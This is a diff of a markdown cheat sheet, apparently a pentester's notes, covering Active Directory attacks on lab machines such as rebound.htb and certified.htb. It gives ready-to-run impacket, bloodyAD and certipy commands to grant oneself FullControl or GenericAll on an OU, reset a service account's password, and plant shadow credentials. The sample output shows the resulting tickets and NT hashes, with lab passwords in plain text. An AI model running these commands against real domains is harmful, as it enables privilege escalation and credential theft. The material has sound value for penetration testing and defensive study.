@@ -10,21 +10,23 @@ tags: ["Shadow Credentials", "Powerview", "Credential Dumping", "AddMember", "Im
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Add Full Control to Current User
+#### 1. Add Full Control to Current User \[Optional\]
 
 {{< tab set1-1 tab1 active >}}impacket{{< /tab >}}{{< tab set1-1 tab2 >}}bloodyAD{{< /tab >}}
 {{< tabcontent set1-1 tab1 >}}
 
 ```console
-sudo ntpdate -s <DC> && impacket-dacledit -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
+# Kerberos
+sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
 ```
 
 ```console {class=sample-code}
-$ impacket-dacledit -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+$ sudo ntpdate -s 10.129.232.31 && impacket-dacledit 'REBOUND.HTB/oorend:1GR8t@$$4u' -k -dc-ip DC01.REBOUND.HTB -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
 [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
-[*] DACL backed up to dacledit-20240923-015912.bak
+[*] DACL backed up to dacledit-20250716-233547.bak
 [*] DACL modified successfully!
 ```
 
@@ -37,7 +39,7 @@ bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=
 ```
 
 ```console {class=sample-code}
-$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
+$ bloodyAD -d REBOUND.HTB -u 'oorend' -p '1GR8t@$$4u' --host DC01.REBOUND.HTB add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
 [+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
 ```
 
@@ -53,7 +55,7 @@ bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARG
 ```
 
 ```console {class="sample-code"}
-$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 set password 'winrm_svc' 'Test1234'
+$ bloodyAD -d REBOUND.HTB -u 'oorend' -p '1GR8t@$$4u' --host DC01.REBOUND.HTB set password 'winrm_svc' '1GR8t@$$4u'
 [+] Password changed successfully!
 ```
 
@@ -95,26 +97,28 @@ Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
 
 ---
 
-### Abuse #2: Get Shadow Credential
+### Abuse #2: Shadow Credential
 
 {{< tab set3 tab1 >}}Linux{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-#### 1. Add Full Control to Current User
+#### 1. Add Full Control to Current User \[Optional\]
 
 {{< tab set3-1 tab1 active >}}impacket{{< /tab >}}{{< tab set3-1 tab2 >}}bloodyAD{{< /tab >}}
 {{< tabcontent set3-1 tab1 >}}
 
 ```console
-sudo ntpdate -s <DC> && impacket-dacledit -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
+# Kerberos
+sudo ntpdate -s <DC_IP> && impacket-dacledit '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
 ```
 
 ```console {class="sample-code"}
-$ impacket-dacledit -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
-Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+$ sudo ntpdate -s 10.129.232.31 && impacket-dacledit 'REBOUND.HTB/oorend:1GR8t@$$4u' -k -dc-ip DC01.REBOUND.HTB -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[-] CCache file is not found. Skipping...
 [*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
-[*] DACL backed up to dacledit-20240923-015912.bak
+[*] DACL backed up to dacledit-20250716-233547.bak
 [*] DACL modified successfully!
 ```
 
@@ -126,54 +130,104 @@ bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=
 ```
 
 ```console {class="sample-code"}
-$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
+$ bloodyAD -d REBOUND.HTB -u 'oorend' -p '1GR8t@$$4u' --host DC01.REBOUND.HTB add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
 [+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
 ```
 
 {{< /tabcontent >}}
 
-#### 2. Get Shadow Credential
+#### 2. Shadow Credential
 
 ```console
-sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USER>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC> -scheme ldap
+# Password
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -password '<PASSWORD>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s dc01.rebound.htb && certipy-ad shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb
-Certipy v4.8.2 - by Oliver Lyak (ly4k)
+$ certipy-ad shadow auto -username judith.mader@certified.htb -password 'judith09' -account management_svc -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186                                           
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
+[*] Targeting user 'management_svc'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID 'b7e204ab-10bb-721e-4f98-72297623b1ad'
+[*] Adding Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
+[*] Successfully added Key Credential with device ID 'b7e204ab-10bb-721e-4f98-72297623b1ad' to the Key Credentials for 'management_svc'
+[*] Authenticating as 'management_svc' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'management_svc@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'management_svc.ccache'
+File 'management_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
+[*] Wrote credential cache to 'management_svc.ccache'
+[*] Trying to retrieve NT hash for 'management_svc'
+[*] Restoring the old Key Credentials for 'management_svc'
+[*] Successfully restored the old Key Credentials for 'management_svc'
+[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
+```
+
+```console
+# NTLM
+certipy-ad shadow auto -username '<USER>@<DOMAIN>' -hashes '<HASH>' -account <TARGET_USER> -target <DC> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ certipy-ad shadow auto -username 'management_svc@CERTIFIED.HTB' -hashes ':a091c1832bcdd4677c28b5a6a1295584' -account CA_OPERATOR -target DC01.CERTIFIED.HTB -dc-ip 10.129.231.186
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'ca_operator'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d'
+[*] Adding Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
+[*] Successfully added Key Credential with device ID '4b1488b9-5edd-6d6a-b92d-f2d299d43b7d' to the Key Credentials for 'ca_operator'
+[*] Authenticating as 'ca_operator' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'ca_operator@certified.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'ca_operator.ccache'
+[*] Wrote credential cache to 'ca_operator.ccache'
+[*] Trying to retrieve NT hash for 'ca_operator'
+[*] Restoring the old Key Credentials for 'ca_operator'
+[*] Successfully restored the old Key Credentials for 'ca_operator'
+[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
+```
+
+```console
+# Kerberos
+sudo ntpdate -s <DC_IP> && certipy-ad shadow auto -username <USER>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC> -dc-host <DC> -ldap-scheme ldap -ns <DC_IP> -dc-ip <DC_IP>
+```
+
+```console {class="sample-code"}
+$ sudo ntpdate -s 10.129.232.31 && certipy-ad shadow auto -username oorend@REBOUND.HTB -password '1GR8t@$$4u' -k -account winrm_svc -target DC01.REBOUND.HTB -dc-host DC01.REBOUND.HTB -ldap-scheme ldap -ns 10.129.232.31
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[!] KRB5CCNAME environment variable not set
 [*] Targeting user 'winrm_svc'
 [*] Generating certificate
 [*] Certificate generated
 [*] Generating Key Credential
-[*] Key Credential generated with DeviceID '22fdb427-7028-72b8-bc39-8f4674c644dd'
-[*] Adding Key Credential with device ID '22fdb427-7028-72b8-bc39-8f4674c644dd' to the Key Credentials for 'winrm_svc'
-[*] Successfully added Key Credential with device ID '22fdb427-7028-72b8-bc39-8f4674c644dd' to the Key Credentials for 'winrm_svc'
+[*] Key Credential generated with DeviceID '6ea7763d-2272-1bea-078c-e58a01662a29'
+[*] Adding Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
+[*] Successfully added Key Credential with device ID '6ea7763d-2272-1bea-078c-e58a01662a29' to the Key Credentials for 'winrm_svc'
 [*] Authenticating as 'winrm_svc' with the certificate
-[*] Using principal: winrm_svc@rebound.htb
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'winrm_svc@rebound.htb'
 [*] Trying to get TGT...
 [*] Got TGT
-[*] Saved credential cache to 'winrm_svc.ccache'
+[*] Saving credential cache to 'winrm_svc.ccache'
+[*] Wrote credential cache to 'winrm_svc.ccache'
 [*] Trying to retrieve NT hash for 'winrm_svc'
 [*] Restoring the old Key Credentials for 'winrm_svc'
 [*] Successfully restored the old Key Credentials for 'winrm_svc'
 [*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
-```
-
-#### FIX: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
-
-```console
-# No really a fix, need to runas administrator
-gpupdate /force
-```
-
-```console {class="sample-code"}
-*Evil-WinRM* PS C:\Users\Administrator\Documents> gpupdate /force
-Updating policy...
-
-Computer Policy update has completed successfully.
-
-User Policy update has completed successfully.
 ```
 
 {{< /tabcontent >}}
